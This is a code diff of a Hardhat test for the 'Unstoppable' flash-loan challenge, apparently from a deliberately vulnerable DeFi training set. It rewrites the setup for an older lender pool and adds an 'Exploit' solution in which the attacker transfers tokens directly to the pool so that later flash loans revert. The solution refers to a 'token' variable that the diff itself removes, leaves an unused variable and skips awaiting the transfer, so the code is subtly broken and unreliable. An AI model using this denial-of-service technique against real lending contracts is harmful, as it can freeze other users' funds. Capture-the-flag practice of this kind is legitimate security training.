@@ -2,57 +2,54 @@ const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
 describe('[Challenge] Unstoppable', function () {
-    let deployer, player, someUser;
-    let token, vault, receiverContract;
+    let deployer, attacker, someUser;
 
-    const TOKENS_IN_VAULT = 1000000n * 10n ** 18n;
-    const INITIAL_PLAYER_TOKEN_BALANCE = 10n * 10n ** 18n;
+    // Pool has 1M * 10**18 tokens
+    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
+    const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
 
-        [deployer, player, someUser] = await ethers.getSigners();
+        [deployer, attacker, someUser] = await ethers.getSigners();
 
-        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
-        vault = await (await ethers.getContractFactory('UnstoppableVault', deployer)).deploy(
-            token.address,
-            deployer.address, // owner
-            deployer.address // fee recipient
-        );
-        expect(await vault.asset()).to.eq(token.address);
+        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
+        const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);
 
-        await token.approve(vault.address, TOKENS_IN_VAULT);
-        await vault.deposit(TOKENS_IN_VAULT, deployer.address);
+        this.token = await DamnValuableTokenFactory.deploy();
+        this.pool = await UnstoppableLenderFactory.deploy(this.token.address);
 
-        expect(await token.balanceOf(vault.address)).to.eq(TOKENS_IN_VAULT);
-        expect(await vault.totalAssets()).to.eq(TOKENS_IN_VAULT);
-        expect(await vault.totalSupply()).to.eq(TOKENS_IN_VAULT);
-        expect(await vault.maxFlashLoan(token.address)).to.eq(TOKENS_IN_VAULT);
-        expect(await vault.flashFee(token.address, TOKENS_IN_VAULT - 1n)).to.eq(0);
+        await this.token.approve(this.pool.address, TOKENS_IN_POOL);
+        await this.pool.depositTokens(TOKENS_IN_POOL);
+
+        await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);
+
         expect(
-            await vault.flashFee(token.address, TOKENS_IN_VAULT)
-        ).to.eq(50000n * 10n ** 18n);
+            await this.token.balanceOf(this.pool.address)
+        ).to.equal(TOKENS_IN_POOL);
 
-        await token.transfer(player.address, INITIAL_PLAYER_TOKEN_BALANCE);
-        expect(await token.balanceOf(player.address)).to.eq(INITIAL_PLAYER_TOKEN_BALANCE);
+        expect(
+            await this.token.balanceOf(attacker.address)
+        ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);
 
-        // Show it's possible for someUser to take out a flash loan
-        receiverContract = await (await ethers.getContractFactory('ReceiverUnstoppable', someUser)).deploy(
-            vault.address
-        );
-        await receiverContract.executeFlashLoan(100n * 10n ** 18n);
+         // Show it's possible for someUser to take out a flash loan
+         const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
+         this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
+         await this.receiverContract.executeFlashLoan(10);
     });
 
-    it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+    it('Exploit', async function () {
+        /** CODE YOUR EXPLOIT HERE */
+        let contract = await this.token.connect(attacker);
+        token.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
     });
 
     after(async function () {
-        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+        /** SUCCESS CONDITIONS */
 
         // It is no longer possible to execute flash loans
         await expect(
-            receiverContract.executeFlashLoan(100n * 10n ** 18n)
+            this.receiverContract.executeFlashLoan(10)
         ).to.be.reverted;
     });
 });
